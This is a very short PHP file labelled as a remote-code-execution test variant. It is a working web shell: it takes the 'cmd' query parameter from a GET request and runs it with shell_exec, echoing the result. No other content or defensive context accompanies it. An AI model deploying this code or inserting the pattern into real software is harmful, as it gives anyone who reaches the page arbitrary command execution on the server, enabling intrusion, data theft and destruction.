<?php
// RCE test variation #362
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>